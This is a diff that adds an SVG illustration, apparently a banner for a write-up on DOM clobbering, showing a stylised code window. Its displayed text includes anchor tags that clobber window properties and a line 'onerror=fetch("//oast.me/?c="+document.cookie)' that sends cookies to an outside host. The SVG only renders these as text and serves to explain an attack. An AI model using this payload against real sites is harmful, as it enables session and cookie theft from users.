@@ -1,0 +1,16 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 405" role="img" aria-labelledby="title desc">
+  <title id="title">DOM clobbering: the sanitizer never saw it coming</title>
+  <desc id="desc">A dark code window showing two harmless anchor tags silently hijacking window before any script runs.</desc>
+  <rect width="720" height="405" fill="#0f1117"/>
+  <circle cx="30" cy="30" r="6" fill="#dc2626"/><circle cx="52" cy="30" r="6" fill="#475569"/><circle cx="74" cy="30" r="6" fill="#475569"/>
+  <path d="M0 57h720" stroke="#334155"/>
+  <g font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="21">
+    <text x="40" y="115" fill="#64748b">01</text><text x="90" y="115" fill="#94a3b8">&lt;a id=<tspan fill="#ef4444">x</tspan>&gt;  &lt;a id=<tspan fill="#ef4444">x</tspan> name=<tspan fill="#ef4444">y</tspan>&gt;</text>
+    <text x="40" y="167" fill="#64748b">02</text><text x="90" y="167" fill="#475569">// no &lt;script&gt;. the browser did the rest.</text>
+    <rect x="84" y="192" width="600" height="40" rx="6" fill="#dc2626" opacity=".22"/>
+    <text x="40" y="219" fill="#64748b">03</text><text x="100" y="219" fill="#e2e8f0">window.<tspan fill="#ef4444">x</tspan>.<tspan fill="#ef4444">y</tspan>  <tspan fill="#f59e0b">HACKED</tspan></text>
+    <rect x="84" y="246" width="600" height="40" rx="6" fill="#dc2626" opacity=".13"/>
+    <text x="40" y="271" fill="#64748b">04</text><text x="90" y="271" fill="#ef4444">onerror=<tspan fill="#f97316">fetch</tspan>(<tspan fill="#fbbf24">"//oast.me/?c="</tspan>+<tspan fill="#a78bfa">document</tspan>.<tspan fill="#f97316">cookie</tspan>)</text>
+    <text x="40" y="323" fill="#64748b">05</text><text x="90" y="323" fill="#334155">markup rewrote JS. The sanitizer witnessed it.</text>
+  </g>
+</svg>
